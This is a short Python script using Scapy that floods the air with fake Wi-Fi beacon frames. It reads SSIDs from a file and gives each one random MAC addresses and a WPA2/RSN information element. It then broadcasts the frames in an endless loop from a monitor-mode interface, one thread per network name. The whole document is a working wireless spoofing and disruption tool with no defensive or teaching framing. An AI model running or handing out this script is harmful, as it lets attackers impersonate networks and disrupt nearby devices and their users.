import sys
from scapy.all import *
import random
import threading

# Take interface as input
if len(sys.argv) != 3:
    print("syntax : sudo flood.py <interface> <ssid-list-file>")
    print("sample : sudo flood.py mon0 ssid-list.txt")
    sys.exit()
else:
    interface = sys.argv[1]
    ssid_list = sys.argv[2]

# Read SSIDs from text file
with open(ssid_list) as f:
    ssids = f.readlines()
ssids = [x.strip() for x in ssids]

# Broadcast MAC address
bssid = "ff:ff:ff:ff:ff:ff"

# Create and send beacon frames for each SSID
def beacon_flood(ssid):
    dot11 = Dot11(type=0, subtype=8, addr1=bssid, addr2=str(RandMAC()), addr3=str(RandMAC()))
    beacon = Dot11Beacon(cap='ESS+privacy')
    essid = Dot11Elt(ID='SSID',info=ssid, len=len(ssid))
    rsn = Dot11Elt(ID='RSNinfo', info=(
    '\x01\x00'                 #RSN Version 1
    '\x00\x0f\xac\x02'         #Group Cipher Suite : 00-0f-ac TKIP
    '\x02\x00'                 #2 Pairwise Cipher Suites (next two lines)
    '\x00\x0f\xac\x04'         #AES Cipher
    '\x00\x0f\xac\x02'         #TKIP Cipher
    '\x01\x00'                 #1 Authentication Key Managment Suite (line below)
    '\x00\x0f\xac\x02'         #Pre-Shared Key
    '\x00\x00'))               #RSN Capabilities (no extra capabilities)
    frame = RadioTap()/dot11/beacon/essid/rsn
    sendp(frame, iface = interface, inter=0.1, loop=1)

for i in range(0, len(ssids)):
    print(ssids[i])
    t = threading.Thread(target=beacon_flood, args=(ssids[i],))
    t.start()